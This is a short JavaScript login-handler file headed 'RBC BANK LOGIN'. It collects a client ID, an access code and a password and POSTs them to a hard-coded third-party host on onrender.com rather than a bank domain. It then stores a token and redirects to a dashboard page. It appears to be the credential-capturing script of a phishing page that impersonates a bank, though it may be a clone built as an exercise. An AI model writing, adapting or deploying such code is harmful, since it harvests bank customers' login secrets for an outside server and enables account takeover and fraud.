// =======================================
// RBC BANK LOGIN
// =======================================

const API_URL = "https://canada-1.onrender.com";

document.addEventListener("DOMContentLoaded", () => {

    const form = document.getElementById("loginForm");

    form.addEventListener("submit", async (e) => {

        e.preventDefault();

        const clientId = document.getElementById("client").value.trim().toUpperCase();
        const accessCode = document.getElementById("access").value.trim();
        const password = document.getElementById("password").value.trim();

        try {

            const response = await fetch(`${API_URL}/api/login`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    clientId,
                    accessCode,
                    password
                })
            });

            const result = await response.json();

            if (!response.ok) {
                alert(result.message || "Login failed.");
                return;
            }

            localStorage.setItem("token", result.token);

            alert("Login successful.");

            window.location.href = "dashboard.html";

        } catch (error) {

            console.error(error);
            alert("Unable to contact the server.");

        }

    });

});
